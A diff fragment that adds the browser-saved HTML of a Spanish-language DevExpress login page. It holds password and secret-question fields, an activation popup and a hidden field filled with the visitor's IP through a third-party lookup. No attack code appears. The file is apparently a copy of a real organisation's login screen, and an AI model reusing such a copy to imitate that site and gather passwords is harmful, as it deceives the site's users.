+dxo.controlCellStyles = { cssClass: 'dxeErrorFrame dxeErrorFrameSys dxeNoBorderBottom dxeControlsCell', style: "" };
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.styleDecoration.AddStyle('N','dxeNullText','');
+dxo.nullText = 'Ingrese su password';
+dxo.errorCellPosition = 'Bottom';
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                </td>
+								</tr>
+							</tbody></table></td>
+						</tr><tr>
+							<td id="ASPxRoundPanel1_frmLogin_2" class="dxflHACSys dxflGroupCell_Aqua" style="width:100%;"><div class="dxflCLLSys dxflItemSys dxflButtonItemSys dxflItem_Aqua" style="width:100%;">
+								
+                                                    <table style="width:100%">
+                                                        <tbody><tr>
+                                                            <td align="center"><div class="dxbButton_Aqua dxbButtonSys dxbTSys" id="ASPxRoundPanel1_frmLogin_btnIngresar" style="-khtml-user-select:none;">
+									<div class="dxb" id="ASPxRoundPanel1_frmLogin_btnIngresar_CD">
+										<div class="dxb-hbc">
+											<input class="dxb-hb" value="Ingresar" type="submit" name="ASPxRoundPanel1$frmLogin$btnIngresar" readonly="readonly">
+										</div><span class="dx-vam">Ingresar</span>
+									</div>
+								</div><script id="dxss_1287170829" type="text/javascript">
+<!--
+aspxAddHoverItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbButtonHover_Aqua'],[''],[''],['','TC']]]);
+aspxAddPressedItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbButtonPressed_Aqua'],[''],[''],['','TC']]]);
+
+var dxo = new ASPxClientButton('ASPxRoundPanel1_frmLogin_btnIngresar');
+window['ASPxRoundPanel1_frmLogin_btnIngresar'] = dxo;
+dxo.autoPostBack = true;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$btnIngresar';
+dxo.RegisterServerEventAssigned(['Click']);
+aspxAddSelectedItems('ASPxRoundPanel1_frmLogin_btnIngresar',[[['dxbf'],[''],['CD']]]);
+dxo.AfterCreate();
+
+//-->
+</script></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td align="left">
+                                                                <a class="dxeHyperlink" id="ASPxRoundPanel1_frmLogin_hl_Olvido" href="recuperarClave.aspx" style="color:#0066CC;font-family:Arial;font-size:11px;text-decoration:none;">¿olvido su clave?</a>
+                                                                <table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtIP" style="width:170px;border-collapse:collapse;display:none;">
+									<tbody><tr>
+										<td class="dxic" style="width: 100%; white-space: normal;"><input class="dxeEditArea dxeEditAreaSys" id="ASPxRoundPanel1_frmLogin_txtIP_I" name="ASPxRoundPanel1$frmLogin$txtIP" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtIP')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtIP')" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtIP')" type="text"></td>
+									</tr>
+								</tbody></table><script id="dxss_965717708" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtIP',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtIP');
+window['txtIP'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtIP';
+dxo.clientVisible = false;
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody></table>
+                                                        
+                                                
+							</div></td>
+						</tr>
+					</tbody></table>
+				</div><script id="dxss_1978283788" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientFormLayout('ASPxRoundPanel1_frmLogin');
+window['frmLogin'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin';
+dxo.CreateItems([['','0',,,,],['','1',,,,],['','2',,,,]]);
+dxo.AfterCreate();
+
+//-->
+</script>
+                            
+			</div>
+		</div></td>
+	</tr>
+</tbody></table>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+        <input type="hidden" id="ppcMensajeWS" name="ppcMensajeWS" value="0:0:-1:-10000:-10000:0:350:100:1:0:0:0"><div id="ppcMensaje_PW-1" class="dxpcLite_Aqua dxpclW" style="height:100px;width:350px;cursor:default;z-index:10000;display:none;visibility:hidden;">
+	<div class="dxpc-mainDiv dxpc-shadow">
+		<div class="dxpc-header dxpc-withBtn" id="ppcMensaje_PWH-1">
+			<div class="dxpc-closeBtn" id="ppcMensaje_HCB-1">
+				<img class="dxWeb_pcCloseButton_Aqua" src="/DXR.axd?r=1_19-FO8ck" alt="[Cerrar]">
+			</div><div class="dxpc-headerContent">
+				<span class="dxpc-headerText dx-vam" id="ppcMensaje_PWH-1T">Login</span>
+			</div><b class="dx-clear"></b>
+		</div><div class="dxpc-contentWrapper">
+			<div class="dxpc-content" id="ppcMensaje_PWC-1">
+				
+                    <span class="dxeBase" id="ppcMensaje_txtMensaje">ASPxLabel</span>
+                
+			</div>
+		</div>
+	</div>
+</div><div id="ppcMensaje_DXPWMB-1" class="dxpcModalBackLite_Aqua" style="z-index:9999;">
+
+</div><script id="dxss_489450871" type="text/javascript">
+<!--
+aspxAddHoverItems('ppcMensaje',[[['dxpc-closeBtnHover'],[''],['HCB-1']]]);
+
+var dxo = new ASPxClientPopupControl('ppcMensaje');
+window['ppcMensaje'] = dxo;
+dxo.popupAnimationType='fade';
+dxo.popupHorizontalAlign='WindowCenter';
+dxo.popupVerticalAlign='WindowCenter';
+dxo.isPopupPositionCorrectionOn=false;
+dxo.width=350;
+dxo.widthFromServer=true;
+dxo.height=100;
+dxo.AfterCreate();
+
+//-->
+</script>
+         <input type="hidden" id="ppc_ActivaClaveWS" name="ppc_ActivaClaveWS" value="0:0:-1:-10000:-10000:0:500:150:1:0:0:0"><div id="ppc_ActivaClave_PW-1" class="dxpcLite_Aqua dxpclW dxpc-mainDiv dxpc-shadow" style="height:150px;width:500px;cursor:default;z-index:10000;display:none;visibility:hidden;">
+	<div class="dxpc-header dxpc-withBtn" id="ppc_ActivaClave_PWH-1">
+		<div class="dxpc-closeBtn" id="ppc_ActivaClave_HCB-1">
+			<img class="dxWeb_pcCloseButton_Aqua" src="/DXR.axd?r=1_19-FO8ck" alt="[Cerrar]">
+		</div><div class="dxpc-headerContent">
+			<span class="dxpc-headerText dx-vam" id="ppc_ActivaClave_PWH-1T">ACTIVAR CLAVE</span>
+		</div><b class="dx-clear"></b>
+	</div><div class="dxpc-contentWrapper">
+		<div class="dxpc-content" id="ppc_ActivaClave_PWC-1">
+			Estimado usuario, debe cambiar su clave asignada y completar los datos necesarios para recuperar su contraseña en caso de olvido, para continuar debe registrar todos los datos solictados.<br><span style="color:red">Te recordamos que esta es la misma clave que debes utilizar para acceder a la APP móvil.</span>
+                       <input type="hidden" id="ppc_ActivaClave_ASPxValidationSummary1_IE" name="ppc_ActivaClave_ASPxValidationSummary1_IE" value=""><table class="dxvsValidationSummary" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_ASPxValidationSummary1" style="border-collapse: collapse; display: none;">
+				<tbody><tr>
+					<td class="dxvsRC"><table class="dxvsT" cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;border-collapse:separate;">
+						<tbody>
+					</tbody></table></td>
+				</tr>
+			</tbody></table><script id="dxss_1072476935" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientValidationSummary('ppc_ActivaClave_ASPxValidationSummary1');
+window['ppc_ActivaClave_ASPxValidationSummary1'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$ASPxValidationSummary1';
+dxo.validationGroup = "ActivaClave";
+dxo.sampleErrorContainer = '<tr class="dxvsE"> <td class="dxvsETC"><a class="dxvsHL" href="javascript:;">&nbsp;</a></td></tr>';
+dxo.AfterCreate();
+
+//-->
+</script>
+                      <table>
+                           <tbody><tr>
+                               <td>Nueva Clave</td>
+                               <td>
+                                   <script id="dxss_926472333" type="text/javascript">
+<!--
+aspxAddDisabledItems('ppc_ActivaClave_txtContrasena',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtContrasena');
+window['txtContrasena'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtContrasena';
+dxo.Validation.AddHandler(function(s, e) { largoClave(s, e); });
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe ingresar clave') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.helpText = 'M&#225;ximo 10 caracteres';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.externalTableStyle=['dxeRoot', null];
+dxo.AfterCreate();
+
+//-->
+</script><table id="ppc_ActivaClave_txtContrasena_ET" cellpadding="0" cellspacing="0" class="dxeRoot"><tbody><tr><td><table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtContrasena" style="width:100px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtContrasena_I" name="ppc_ActivaClave$txtContrasena" onfocus="aspxEGotFocus('ppc_ActivaClave_txtContrasena')" onblur="aspxELostFocus('ppc_ActivaClave_txtContrasena')" onchange="aspxEValueChanged('ppc_ActivaClave_txtContrasena')" type="password" maxlength="10"></td>
+				</tr>
+			</tbody></table><input type="hidden" name="ppc_ActivaClave$txtContrasena$CVS" value=""></td></tr><tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Máximo 10 caracteres</label></td></tr></tbody></table>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Reingrese Clave</td>
+                               <td>
+                                   
+                                   <script id="dxss_519882400" type="text/javascript">
+<!--
+aspxAddDisabledItems('ppc_ActivaClave_txtContrasena2',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtContrasena2');
+window['txtContrasena2'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtContrasena2';
+dxo.Validation.AddHandler(function(s, e) { ComparaClaves(s, e); });
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe validar clave') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.helpText = 'M&#225;ximo 10 caracteres';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.externalTableStyle=['dxeRoot', null];
+dxo.AfterCreate();
+
+//-->
+</script><table id="ppc_ActivaClave_txtContrasena2_ET" cellpadding="0" cellspacing="0" class="dxeRoot"><tbody><tr><td><table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtContrasena2" style="width:100px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtContrasena2_I" name="ppc_ActivaClave$txtContrasena2" onfocus="aspxEGotFocus('ppc_ActivaClave_txtContrasena2')" onblur="aspxELostFocus('ppc_ActivaClave_txtContrasena2')" onchange="aspxEValueChanged('ppc_ActivaClave_txtContrasena2')" type="password" maxlength="10"></td>
+				</tr>
+			</tbody></table><input type="hidden" name="ppc_ActivaClave$txtContrasena2$CVS" value=""></td></tr><tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Máximo 10 caracteres</label></td></tr></tbody></table>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Pregunta Secreta</td>
+                               <td>
+                                   <select name="ppc_ActivaClave$ddlPregunta" id="ppc_ActivaClave_ddlPregunta">
+				<option value="Pelicula Favorita">Pelicula Favorita</option>
+				<option value="Color Favorito">Color Favorito</option>
+				<option value="Cantante Favorito(a)">Cantante Favorito(a)</option>
+				<option value="Numero Favorito">Numero Favorito</option>
+				<option value="Musica Favorita">Musica Favorita</option>
+				<option value="Deporte Favorito">Deporte Favorito</option>
+				<option value="Comida Favorita ">Comida Favorita </option>
+				<option value="Actividad Favorita">Actividad Favorita</option>
+				<option value="Mascota Favorita">Mascota Favorita</option>
+
+			</select>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Respuesta</td>
+                               <td>
+                                   <table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtRespuesta" style="width:250px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtRespuesta_I" name="ppc_ActivaClave$txtRespuesta" onfocus="aspxEGotFocus('ppc_ActivaClave_txtRespuesta')" onblur="aspxELostFocus('ppc_ActivaClave_txtRespuesta')" onchange="aspxEValueChanged('ppc_ActivaClave_txtRespuesta')" type="text" maxlength="50"></td>
+				</tr>
+			</tbody></table><script id="dxss_428502311" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtRespuesta');
+window['ppc_ActivaClave_txtRespuesta'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtRespuesta';
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe ingresar una respuesta') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.AfterCreate();
+
+//-->
+</script>
+                               <input type="hidden" name="ppc_ActivaClave$txtRespuesta$CVS" value=""></td>
+                           </tr>
+                           <tr>
+                               <td colspan="2" style="text-align:center">
+                                   <div class="dxbButton_Aqua dxbButtonSys dxbTSys" id="ppc_ActivaClave_btnActivaCalve" style="font-family:Arial;font-size:12px;font-weight:bold;height:22px;-khtml-user-select:none;">
+				<div class="dxb" id="ppc_ActivaClave_btnActivaCalve_CD">
+					<div class="dxb-hbc">
+						<input class="dxb-hb" value="Grabar" type="submit" name="ppc_ActivaClave$btnActivaCalve" readonly="readonly">
+					</div><span class="dx-vam">Grabar</span>
+				</div>
+			</div><script id="dxss_126980885" type="text/javascript">
+<!--
+aspxAddHoverItems('ppc_ActivaClave_btnActivaCalve',[[['dxbButtonHover_Aqua'],[''],[''],['','TC']]]);
+aspxAddPressedItems('ppc_ActivaClave_btnActivaCalve',[[['dxbButtonPressed_Aqua'],[''],[''],['','TC']]]);
+
+var dxo = new ASPxClientButton('ppc_ActivaClave_btnActivaCalve');
+window['ppc_ActivaClave_btnActivaCalve'] = dxo;
+dxo.autoPostBack = true;
+dxo.uniqueID = 'ppc_ActivaClave$btnActivaCalve';
+dxo.RegisterServerEventAssigned(['Click']);
+aspxAddSelectedItems('ppc_ActivaClave_btnActivaCalve',[[['dxbf'],[''],['CD']]]);
+dxo.validationGroup = "ActivaClave";
+dxo.AfterCreate();
+
+//-->
+</script>
+                               </td>
+                           </tr>
+                       </tbody></table>
+                   
+		</div>
+	</div>
+</div><div id="ppc_ActivaClave_DXPWMB-1" class="dxpcModalBackLite_Aqua" style="z-index:9999;">
+
+</div><table id="ppc_ActivaClave_LP" class="dxpcLoadingPanel_Aqua dxlpLoadingPanel_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;left:0px;top:0px;z-index:30000;display:none;">
+	<tbody><tr>
+		<td class="dx"><img class="dxlp-loadingImage dxlp-imgPosTop" src="/DXR.axd?r=1_19-FO8ck" alt="" align="middle"><br><span id="ppc_ActivaClave_TL">Cargando…</span></td>
+	</tr>
+</tbody></table><div id="ppc_ActivaClave_LD" class="dxpcLoadingDiv_Aqua dxlpLoadingDiv_Aqua dx-ft" style="left:0px;top:0px;z-index:29999;display:none;position:absolute;">
+
+</div><script id="dxss_1394382019" type="text/javascript">
+<!--
+aspxAddHoverItems('ppc_ActivaClave',[[['dxpc-closeBtnHover'],[''],['HCB-1']]]);
+
+var dxo = new ASPxClientPopupControl('ppc_ActivaClave');
+window['ppc_ActivaClave'] = dxo;
+dxo.encodeHtml = false;
+dxo.callBack = function(arg) { WebForm_DoCallback('ppc_ActivaClave',arg,aspxCallback,'ppc_ActivaClave',aspxCallbackError,true); };
+dxo.enableAnimation=false;
+dxo.popupAction='MouseOver';
+dxo.closeAction='CloseButton';
+dxo.popupHorizontalAlign='WindowCenter';
+dxo.popupVerticalAlign='WindowCenter';
+dxo.isPopupPositionCorrectionOn=false;
+dxo.width=500;
+dxo.widthFromServer=true;
+dxo.height=150;
+dxo.defaultWindowPopupElementIDList=['popup'];
+dxo.AfterCreate();
+
+//-->
+</script>
+    
+
+<script type="text/javascript">
+//<![CDATA[
+
+var callBackFrameUrl='/WebResource.axd?d=myfKNOXtGKNRwJ8HHeqsqFd8c0-zv6xz22B13Zl7UDCtR4PfOzzs3pmXJOh9dFIIoWLUsp6CWpso-4vRVOSqM2LkY5Yz4w60Eyo5Cn-tSy41&t=638942102819057530';
+WebForm_InitCallback();//]]>
+</script>
+<input type="hidden" name="DXScript" id="DXScript" value="1_187,1_101,1_180,1_98,1_172,1_178,1_163,1_142,1_130,1_137,1_121,1_170,1_139"><input type="hidden" name="DXCss" id="DXCss" value="../css/login.css,1_14,1_16,1_1,0_275,0_279,1_7,1_8,1_6,0_105,0_107"></form>
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7492d97e98584332b31c700b9b368fcf&quot;}" crossorigin="anonymous"></script>
+
+
+<audio class="audio-output" style="display: none;"></audio><div id="volume-booster-visusalizer">
+                    <div class="sound">
+                        <div class="sound-icon"></div>
+                        <div class="sound-wave sound-wave_one"></div>
+                        <div class="sound-wave sound-wave_two"></div>
+                        <div class="sound-wave sound-wave_three"></div>
+                    </div>
+                    <div class="segments-box">
+                        <div data-range="1-20" class="segment"><span></span></div>
+                        <div data-range="21-40" class="segment"><span></span></div>
+                        <div data-range="41-60" class="segment"><span></span></div>
+                        <div data-range="61-80" class="segment"><span></span></div>
+                        <div data-range="81-100" class="segment"><span></span></div>
+                    </div>
+                </div></body>
 </html>
